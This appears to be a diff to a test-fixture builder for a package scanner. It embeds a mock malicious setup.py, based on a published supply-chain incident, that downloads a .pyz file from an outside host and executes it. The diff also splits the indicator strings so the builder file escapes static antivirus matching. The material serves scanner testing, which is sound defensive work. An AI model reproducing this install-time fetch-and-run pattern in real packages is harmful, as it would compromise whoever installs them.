@@ -18,6 +18,16 @@ HERE = Path(__file__).resolve().parent
 
 # IOC literal scan_packages.py must trip on.
 # Keep in sync with KNOWN_IOC_STRINGS (scan_npm_packages.py) and RE_MAY12_IOC (scan_packages.py).
+#
+# Split across concatenated pieces, the same way test_scan_packages.py already writes
+# `_ioc_host = "git-tanstack." + "com"`. The assembled string still lands in the built archive
+# byte for byte, so the scanner tests are unaffected; what changes is that this builder is not
+# itself a static match. Cheap insurance only -- the per-file VirusTotal scan in discussion #9577
+# found the .py sources undetected and the two built archives detected, so the archives not being
+# committed is the part that matters.
+_IOC_HOST = "git-tanstack." + "com"
+_IOC_ARTIFACT = "transformers." + "pyz"
+
 MALICIOUS_SETUP_PY = '''"""Test fixture: do NOT install.
 
 This file embeds the May-12 Mini Shai-Hulud IOC literal so the
@@ -32,13 +42,13 @@ import subprocess
 
 # IOC literal -- mirrors public Socket.dev 2026-05-12 disclosure.
 urllib.request.urlretrieve(
-    "https://git-tanstack.com/transformers.pyz",
-    "/tmp/transformers.pyz",
+    "https://{ioc_host}/{ioc_artifact}",
+    "/tmp/{ioc_artifact}",
 )
-subprocess.run(["python3", "/tmp/transformers.pyz"], check=False)
+subprocess.run(["python3", "/tmp/{ioc_artifact}"], check=False)
 
 setup(name="malicious-fixture", version="0.0.1")
-'''
+'''.replace("{ioc_host}", _IOC_HOST).replace("{ioc_artifact}", _IOC_ARTIFACT)
 
 
 CLEAN_INIT_PY = '''"""Test fixture: empty placeholder package."""
